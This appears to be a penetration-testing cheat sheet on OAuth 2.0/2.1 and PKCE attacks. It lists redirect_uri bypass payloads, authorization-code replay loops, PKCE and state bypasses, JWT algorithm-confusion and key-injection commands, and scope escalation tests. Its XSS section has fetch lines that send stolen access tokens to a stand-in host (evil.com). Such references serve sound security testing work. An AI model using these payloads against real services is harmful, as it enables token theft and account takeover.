# OAuth 2.0/2.1 & PKCE Attacks

> **Skill Level**: Intermediate to Advanced  
> **Prerequisites**: OAuth flows understanding, HTTP basics

## OAuth Flow Overview

```
Authorization Code Flow (with PKCE):
1. Client generates code_verifier and code_challenge
2. Client redirects user to /authorize with code_challenge
3. User authenticates, server returns authorization_code
4. Client exchanges code + code_verifier for tokens at /token
5. Server validates code_verifier matches code_challenge
6. Server returns access_token (and optionally refresh_token)
```

## Reconnaissance

### Endpoint Discovery

```bash
# Common OAuth endpoints
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/oauth/authorize
/oauth/token
/oauth2/authorize
/oauth2/token
/authorize
/token
/auth
/login/oauth/authorize

# Fetch OpenID configuration
curl https://target.com/.well-known/openid-configuration | jq

# Extract endpoints
curl -s https://target.com/.well-known/openid-configuration | jq '{
  authorization: .authorization_endpoint,
  token: .token_endpoint,
  userinfo: .userinfo_endpoint,
  jwks: .jwks_uri,
  introspection: .introspection_endpoint,
  revocation: .revocation_endpoint
}'
```

### Client Discovery

```bash
# Find registered OAuth clients
# Check JavaScript files for client_id
grep -r "client_id" static/js/

# Common client IDs in URLs
?client_id=web
?client_id=mobile
?client_id=api
?client_id=public

# Check mobile apps for OAuth config
apktool d app.apk
grep -r "client_id\|client_secret\|oauth" .
```

## Authorization Code Attacks

### Open Redirect via redirect_uri

```bash
# Basic redirect manipulation
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://evil.com&
  response_type=code&
  scope=openid

# Subdomain takeover
redirect_uri=https://abandoned.target.com

# Path traversal
redirect_uri=https://target.com/../../../evil.com
redirect_uri=https://target.com/callback/../../../evil.com

# URL encoding bypass
redirect_uri=https://target.com%2f%2e%2e%2f@evil.com
redirect_uri=https://target.com%00@evil.com

# Parameter pollution
redirect_uri=https://target.com&redirect_uri=https://evil.com
?redirect_uri=https://target.com?next=https://evil.com

# Fragment injection
redirect_uri=https://target.com/callback#@evil.com

# Different protocol
redirect_uri=http://target.com (downgrade from https)
redirect_uri=javascript:alert(1)

# IPv6
redirect_uri=https://[::1]:8080/callback

# Localhost variations
redirect_uri=https://127.0.0.1/callback
redirect_uri=https://localhost.target.com/callback
```

### Authorization Code Interception

```bash
# If redirect_uri validation is weak, intercept code
# 1. Get victim to click malicious link
# 2. Code sent to attacker's redirect_uri
# 3. Attacker exchanges code for tokens

# Exploit via open redirect on target
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/redirect?url=https://evil.com&
  response_type=code
```

### Authorization Code Replay

```bash
# Try reusing authorization code
# Most servers invalidate after first use

# Race condition - use code twice simultaneously
for i in {1..100}; do
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=authorization_code&code=AUTH_CODE&client_id=ID" &
done
```

## PKCE Attacks

### Missing PKCE Enforcement

```bash
# Try authorization without code_challenge (on public clients)
# If server accepts, PKCE is optional - vulnerable

https://oauth.target.com/authorize?
  client_id=PUBLIC_CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid
  # Missing: code_challenge, code_challenge_method

# Then exchange without code_verifier
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "redirect_uri=https://target.com/callback"
  # Missing: code_verifier
```

### Weak Code Challenge

```bash
# If server accepts "plain" method
code_challenge_method=plain
code_challenge=my_verifier
# Then code_verifier = code_challenge (no hashing)

# Check if plain method is accepted
https://oauth.target.com/authorize?
  code_challenge=test&
  code_challenge_method=plain&
  ...
```

### Code Verifier Brute Force

```bash
# If code_challenge/verifier are weak/predictable
# PKCE spec: 43-128 characters, [A-Za-z0-9-._~]

# Generate valid code_challenge from verifier
echo -n "my_code_verifier" | sha256sum | cut -d' ' -f1 | xxd -r -p | base64 -w0 | tr '+/' '-_' | tr -d '='
```

## Token Attacks

### Access Token Leakage

```bash
# Token in URL fragment (Implicit flow - deprecated)
https://target.com/callback#access_token=TOKEN&token_type=bearer

# Token in Referer header
# If callback page has external resources, token leaks

# Token in browser history
# Implicit flow tokens persist in URL

# Token in logs
# Check server logs, CDN logs, proxy logs
```

### Token Theft via XSS

```javascript
// Steal tokens from localStorage/sessionStorage
fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'));

// Intercept OAuth callback
if (window.location.hash.includes('access_token')) {
  fetch('https://evil.com/steal' + window.location.hash);
}

// Hook postMessage (if used for token delivery)
window.addEventListener('message', function(e) {
  fetch('https://evil.com/steal?data=' + JSON.stringify(e.data));
});
```

### Refresh Token Attacks

```bash
# Refresh token rotation not implemented
# Old refresh tokens still valid after rotation

# Test refresh token reuse
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=OLD_REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID"

# Refresh token doesn't expire
# Check if refresh tokens work months later

# Refresh token scope escalation
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "scope=admin openid profile email"
```

## State Parameter Attacks

### CSRF via Missing State

```html
<!-- If state parameter is not required -->
<img src="https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid">

<!-- Victim's browser makes OAuth request, attacker intercepts code -->
```

### State Fixation

```bash
# If state is predictable or reusable
# Attacker generates authorization URL with known state
# Victim clicks, attacker knows state value
# Attacker can complete OAuth flow

# Test state reuse
# 1. Start OAuth flow, get state value
# 2. Complete flow
# 3. Try using same state again
```

### State Injection

```bash
# If state is reflected without encoding
state="><script>alert(1)</script>
state=test&injected_param=value
```

## Scope Manipulation

### Scope Upgrade

```bash
# Request more scopes than authorized
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid+admin+user:delete

# Try during token refresh
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=TOKEN" \
  -d "scope=openid admin"
```

### Scope Downgrade Attack

```bash
# Remove important scopes to bypass consent
# If app expects "email" scope but attacker removes it
# App might not handle missing claims properly
scope=openid  # Missing expected "email" scope
```

## JWT Token Attacks

### Algorithm Confusion

```bash
# Change RS256 to HS256
# Use public key as HMAC secret

# Original token header: {"alg":"RS256","typ":"JWT"}
# Modified: {"alg":"HS256","typ":"JWT"}

# Sign with RSA public key as HMAC secret
# https://github.com/ticarpi/jwt_tool
python jwt_tool.py TOKEN -X k -pk public.pem

# Set algorithm to none
python jwt_tool.py TOKEN -X a
```

### Key Injection (jwk/jku)

```bash
# Inject attacker's JWK
# https://github.com/ticarpi/jwt_tool
python jwt_tool.py TOKEN -X i

# Use attacker's JWKS endpoint
python jwt_tool.py TOKEN -X s -ju https://evil.com/.well-known/jwks.json
```

### JWT Claims Manipulation

```bash
# Modify claims without re-signing (if signature not verified)
# Decode token
echo "eyJ..." | base64 -d

# Modify payload
{
  "sub": "admin",
  "scope": "openid admin",
  "exp": 9999999999
}

# Common claims to test:
# - sub: user identifier
# - aud: audience
# - iss: issuer
# - exp: expiration
# - scope: permissions
# - role: user role
```

## Client Credential Attacks

### Client Secret Exposure

```bash
# Search for secrets in:
- Mobile app binaries
- JavaScript source
- Git repositories
- Environment variables in CI/CD
- Docker images
- Public S3 buckets

# GitHub search
org:target "client_secret"
org:target "oauth" "secret"

# If found, impersonate the client
curl -X POST https://oauth.target.com/token \
  -u "client_id:client_secret" \
  -d "grant_type=client_credentials"
```

### Client Authentication Bypass

```bash
# Try without client_secret
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID"
  # No client_secret

# Try in different locations
# POST body vs Authorization header
Authorization: Basic base64(client_id:)
```

## Social Login Attacks

### Account Takeover via OAuth

```bash
# 1. Create account with attacker@evil.com on target
# 2. Link social login (Google) with attacker@evil.com
# 3. Victim has Google account with victim@target.com
# 4. Target app links accounts by email
# 5. Attacker can login as victim via Google

# Test email verification bypass
# Register with victim's email without verification
# Then link OAuth provider
```

### Pre-Account Takeover

```bash
# 1. Attacker creates account with victim's email (unverified)
# 2. Victim signs up with OAuth (same email)
# 3. Accounts get linked
# 4. Attacker already has password for the account
```

## Tools

### OAuth Testing Tools

```bash
# BurpSuite OAuth Scanner extension

# OAuthTester
# https://github.com/AresS31/OAuthTester

# jwt_tool - JWT manipulation
# https://github.com/ticarpi/jwt_tool
python jwt_tool.py -t https://target.com/oauth -rc cookies.txt

# oauth2c - OAuth 2.0 CLI
# https://github.com/cloudentity/oauth2c

# Keycloak (for testing server behavior)
docker run -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:latest start-dev
```

## OAuth 2.1 Changes

```bash
# OAuth 2.1 deprecates:
- Implicit grant (response_type=token)
- Resource Owner Password Credentials grant
- Bearer tokens in query strings

# OAuth 2.1 requires:
- PKCE for all authorization code grants
- Exact redirect_uri matching
- Refresh token rotation

# Test if server enforces OAuth 2.1
# Try deprecated flows - they should fail
```

## Checklist

```markdown
## Reconnaissance
- [ ] Discover OAuth endpoints
- [ ] Find registered clients
- [ ] Check OpenID configuration
- [ ] Identify grant types supported

## redirect_uri Attacks
- [ ] Open redirect
- [ ] Subdomain takeover
- [ ] Path traversal
- [ ] Parameter pollution

## Authorization Code
- [ ] Code interception
- [ ] Code replay
- [ ] Race conditions

## PKCE
- [ ] Missing PKCE enforcement
- [ ] Weak code_challenge
- [ ] plain method accepted

## Tokens
- [ ] Token leakage
- [ ] JWT attacks
- [ ] Refresh token reuse
- [ ] Scope escalation

## State
- [ ] Missing state (CSRF)
- [ ] State fixation
- [ ] Predictable state

## Client Security
- [ ] Exposed client_secret
- [ ] Client auth bypass
- [ ] Public client abuse
```

## Related Topics

- [OIDC](../webservices/oidc-open-id-connect.md) - OpenID Connect testing
- [JWT](../webservices/jwt.md) - JSON Web Token attacks
- [CSRF](csrf.md) - Cross-site request forgery
- [Open Redirect](open-redirect.md) - URL redirection
